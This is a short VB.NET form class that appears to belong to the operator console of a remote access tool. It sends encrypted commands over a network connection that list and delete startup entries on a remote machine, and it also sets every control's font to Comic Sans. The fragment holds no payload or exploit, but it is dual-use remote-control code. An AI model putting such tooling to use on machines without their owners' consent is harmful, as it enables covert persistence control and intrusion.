Public Class FormStartup
    Public connected As Connection
    Private Sub ChangeFont(ByVal container As Control)
        For Each ctrl As Control In container.Controls
            ' Change font for the control
            ctrl.Font = New Font("Comic Sans MS", 9, FontStyle.Regular)

            ' If the control has children, recursively change their fonts
            If ctrl.HasChildren Then
                ChangeFont(ctrl)
            End If
        Next
    End Sub
#Region "Startup"
    Private Sub ToolStripMenuItem4_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ToolStripMenuItem4.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("GetStartup", Form1.enckey))
        Catch
        End Try
    End Sub
    Private Sub RemoveToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles RemoveToolStripMenuItem.Click
        Try
            For Each item As ListViewItem In ListView_Startup.SelectedItems
                connected.Send(New Encryption().AES_Encrypt("RemovefromStartup" & item.Group.Header & "\|" & item.Text, Form1.enckey))
                ListView_Startup.Items.Remove(item)
            Next
        Catch
        End Try
    End Sub
#End Region

    Private Sub FormStartup_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
        ChangeFont(Me)
    End Sub
End Class